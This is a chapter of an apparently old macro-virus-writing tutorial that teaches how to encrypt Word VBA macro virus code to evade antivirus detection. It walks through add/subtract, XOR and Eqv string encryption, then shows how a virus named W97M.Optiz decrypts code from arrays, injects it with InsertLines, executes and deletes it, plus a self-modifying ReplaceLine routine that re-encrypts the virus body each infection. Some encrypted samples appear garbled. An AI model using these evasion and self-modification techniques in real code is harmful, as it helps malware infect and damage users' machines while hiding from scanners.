.Introduction to Encryption</b>

    Hi kids,  welcome to the  encryption part of my guide.  Well encryption
for your macro is a nice way to protect your virus against detection.  It's
my favourite one. ; ) So you may now think about how we can encrypt our bug
to make it unscannable?  Well,  we do not encrypt our bits like in good asm
viruses but  we can encrypt  our commands to hide it from AV scanners.  Ok,
first a bit of theory in encryption, that you understand what I mean. If we
take the string  'Hello'  and change it's characters to the next following,
then our string would be 'Ifmmp'.  Well this is just a very very simple and
very lame technic, but it does it's work. So just get in your mind that our
encryption will  always be  based on character exchanging.  For this we can
use different logical operator which I will explain later. I also found two
nice technics  which do not use these operators  but encrypt the code fine.
For the  encryption with the logical operators,  we always have to define a
key. This key encrypt/decrypts our code. If this key remains the same every
infection we can call it basic encryption but if the key changes every inf-
ection, we call it polymorphic encryption.  ; )  As you now may  can think,
the second one, encryption with different keys, is the better one.  Ok, now
we gonna  take a look on some different  methods we can use to  encrypt our
code.


<b>.Encryption technics</b>

 .Add/Substract method

    Here I will explain you some encryption technics you can use to encrypt
your macro bug. Ok, first I will start with the simple and easy ones, where
we add/substract a number from ascii value of each sign. Similar to add/sub
in asm! ; ). I will now give you an example of this and see the use in your
macro at the next section.  For our example I take the string stored in the
variable and add 23 to each ascii sign.

 OldString = "This is a test!"

 For i = 1 To Len(OldString)
  NewString = NewString & Chr(Asc(Mid(OldString, i, 1)) + 23)
 Next

    After this the encrypted string 'NewString' would be 'kÄä7Ää7x7ã|äã8'.
The problem with this is,  that we have to use a different encryption & de-
cryption routine,  because to decrypt our string again we have to substract
23 from the ascii signs. Well, no problem with the following routine.

 OldString = "kÄä7Ää7x7ã|äã8"

 For i = 1 To Len(OldString)
  NewString = NewString & Chr(Asc(Mid(OldString, i, 1)) - 23)
 Next

    This routine would  decrypt our string again to  'This is a test!' . Of
course  you can  use higher numbers to  add or substract,  but keep in mind
that the  highest number of ascii signs is 255.  If you get higher than 255
your code will crash.  You can also first substract  a number to encrypt it
and the add a number to decrypt it again, well it is your decision.

    This technics are asymmetric encryptions, because you can't use the en-
cryption routine as a decryption routine.


 .XOR method

    Well, why 'famous'? Hmm...it is the basic encryption a normal asm virus
uses. A short example how XOR works. If we take two numbers, 5 and 3 and
use both with XOR we get as result 6. A little graphic will explain.

                  5  XOR  3             =             6
           00000101  XOR  00000011      =      00000110

    Ok, the XOR operator uses binary to compare the two operands, so I show
it also with binary.  As you know or not in binary we only have 0 and 1. So
XOR looks for  each bit of the two  operands and if it is equal it makes it
different.  If you take our example,  the zero bit in both is 1 so the zero
bit in the result will be 0. First bit is in both different so it takes the
higher, 1.  The second bit is again different so it takes again the 1.  Our
result is now 00000110 which is 6 in decimal. Well are you confused? Ok, if
yes then  I will bring now more confusion  in your head.  So what if we use
XOR  on result with one of  the two operands we used first ?  Do you have a
clue?  Well here is the example

                  6  XOR  3             =             5
           00000110  XOR  00000011      =      00000101

    As you see,  XOR takes again each bit of the  two operands and compares
it. The zero bit is different so in our result byte the zero bit will be 1.
First bit is equal so XOR makes it 0 and last second bit is different so it
is 1. If we translate it back to decimal, our result is 5. If this confuses
you too much,  hehehe,  don't care now,  you will need it when you start to
code real viruses in ASM.  For now you can use this command without knowing
what it really does ;P. So, now an example for VBA.

 OurString = "This is a test!"

 For i = 1 To Len(OurString)
  NewAscii = NewAscii & Chr(Asc(Mid(OurString, i, 1)) Xor 23)
 Next

    The encrypted string in 'NewAscii' would now be 'C~d7~d7v7crdc6'.  The
very good on XOR is that we can use this  routine to decrypt the string ag-
ain. As you see, our key is again '23'.  Of course you can change this key,
but remember that you have to decrypt  code you encrypted with the same key
again. Otherwise your code will be destroyed. I have here a little table to
get this XOR on you.

       Bit in      Bit in
      Operand1    Operand2    Result 
     .-------------------------------.
     |    0     |    0     |    0    |
     |    0     |    1     |    1    |
     |    1     |    0     |    1    |
     |    1     |    1     |    0    |
     `-------------------------------¥

 .Equivalent method

    You may wonder why use equivalent of something to encrypt, yah it works
pretty fine.  Eqv does exact the difference to Xor, just take a look on the
little cheesy graphic I did, to see what I mean. (You love my cheesy graph-
ics,  don't you?)  And by the way, I was the first  who used this tech in a
macro bug.  Eqv performs a logical equivalence on two expressions.  Same as
our beloved Xor command, Eqv performs a bitwise comparison.

        Bit in      Bit in  
       Operand1    Operand2   Result
     .-------------------------------.
     |    0     |    0     |    1    |
     |    0     |    1     |    0    |
     |    1     |    0     |    0    |
     |    1     |    1     |    1    |
     `-------------------------------¥

    Well, as you see it does the opposite to XOR and finds the equivalent
of the bit we are comparing. So I am not gonna say more to this.

 OurString = "This is a test!"

 For i = 1 To Len(OurString)
  temp1 = Asc(Mid(OurString, i))
  temp2 = temp1 Eqv 153 * -1
  NewAscii = NewAscii & Chr(temp2)
 Next

    As a result, we would get 'ÃÒÎ∏ÒÎ∏˘∏Ï˝ÎÏπ' in our variable 'NewAscii'.
Well, let me explain this routine a bit. First of all we need to get a sin-
gle ascii value  into our variable temp1.  Then we use this value  with the
logical operator 'Eqv'.  'Eqv' would return a negative value so we multiply
it with -1, after that normal method to get a character back. Ok, this will
work also backwards,  so if you replace the value of OurString with the one
you got in NewAscii  you will see the original string again.  For a working
example of this technic check Class.Equivalent, you can find it in the app-
endix.

    The Xor and the Eqv encryption technics use the same encryption and de-
cryption routine. This is called symmetric encryption. Of course you can be
so kind and use multiple layer encryption. I used it in one of my bugs, but
I don't remember in what. X-D Ok, I am sure I already said too much, so for
sure there are more logical operators you can use for encryption but I just
give you here the basic ones. I hope you could understand what they do. Now
we will take a look on the  basic use of these technics in your macro bugs.


<b>.Using Encryption</b>

    Ok, basically we use two technics for encryption in your macro bug. The
first one is to store all encrypted code in arrays, the first Word 97 macro
which used encryption was W97M.Optiz written by me. The source was included
in LineZer0 Network Zine #1.  It used arrays to store the code. Well, now a
little sceme how it works.


  .---------------------.  Well, may it sounds a bit confusing to you, but
  | A sub that contains |  it isn't. Ok, a bit. If we take Optiz, it tries
  | encrypted code in   |  to encrypt  the code stored in arrays,  inserts
  | arrays and a call   |  it into an empty sub,  executes it and  deletes
  | for crypt function  |  it afterwards.
  .---------------------.
  | An empty sub were   |  In this sub the code gets inserted.
  | you can insert the  |
  | decrypted code      |
  .---------------------.
  |   Crypt function    |  This function decrypts the encrypted code.
  `---------------------¥

    Let me show you  now some source code.  It is the just a  basic example
how this could work in your macro virus.


 OurCode(0) = "lã=bèèåè=oÇê'äÇ=kÇï'"
 OurCode(1) = "pÇ'=^Ä'Ü"Ç|=Z=^Ä'Ü"ÇaåÄ'äÇã'Ks_mèåáÇÄ'Ks_`åäçåãÇã'ê"
 OurCode(2) = "pÇ'=kåèä~â|=Z=kåèä~âqÇäçâ~'ÇKs_mèåáÇÄ'Ks_`åäçåãÇã'ê"

 For y = 0 To 2
  VirusCode = VirusCode & Crypt(OurCode(y)) & VbCr
 Next
 
 ...InsertLines 29, VirusCode

 [Execute code]
 
 ...DeleteLines 29, 3

 -

 Private Function Crypt(OldString)
  For i = 1 To Len(OldString)
   Crypt = Crypt & Chr(Asc(Mid(OldString, i, 1)) + 29)
  Next
 End Function


    What you see here is the technic which Optiz uses. This is just an exa-
mple and you should use another one or not, whatever. So now to a more com-
mon technic. Let me first explain a bit and then show some graphics. Ok, we
gonna see here the common method. A sub, mainly a hook sub, contains a call
for the crypt function that en/decrypts the code. After this call, it calls
the sub that has the en/decrypted  code inside and executes the viral code.


  .--------------------.   This sub, mostly a trigger sub, calls the de-
  |  A sub that calls  |   cryption  function and after that a  call for 
  |  a crypt function  |   the sub that  contains the en/decrypted code.
  .--------------------.
  | A sub that has the |   This sub holds  the en/decrypted code inside.
  | encrypted code in- |   The main virus code.
  | side.              |
  .--------------------.
  |   Crypt function   |   This  function  decrypts the encrypted  code.
  `--------------------¥


  For y = 20 To 22
   ThisDocument.VBProject.VBComponents(1).CodeModule.ReplaceLine _
    y, Crypt(Mid(ThisDocument.VBProject.VBComponents(1).CodeModule _
    .Lines(y, 1), 2), CryptKey)
  Next

  [Execute Code]

  Private Function Crypt(What, CryptKey)
   For x = 1 To Len(What)
    Crypt = Crypt & Chr(Asc(Mid(What, x, 1)) Xor CryptKey)
   Next
  End Function
  
    The sub with the code we need to call, would look like that.

 Private Sub VirusCode()
 '»Èß¬ııËıß’‚ÙÚÍ‚ß…‚ˇÛ
 '»˜ÛÓËÈÙ©‘ÊÒ‚…ËıÍÊÎ◊ıËÍ˜Ûß∫ßØ’È„ßß∑Æ
 'Œ·ß∆˜˜ÎÓ‰ÊÛÓËÈ©—‚ıÙÓËÈß∫ß•æ©∑•ß”Ô‚È
 End Sub

</font>
    This sub 'VirusCode' must contain a routine that encrypts the code just
at the beginning of execution of the viral code, so that we can have to al-
ready new encrypted code stored into a variable. Well, it sounds a bit con-
fusing, but if you take a look at the source codes in the appendix, you may
notice that it is damn easy, or not. ;)

    Ok, that's for now all I have to say about encryption,  if you still do
not understand something re read it again and again, once you have the clue
you will see it's easy.  If you still have problems with this feel free and
mail me. In that sence, happy encryption.
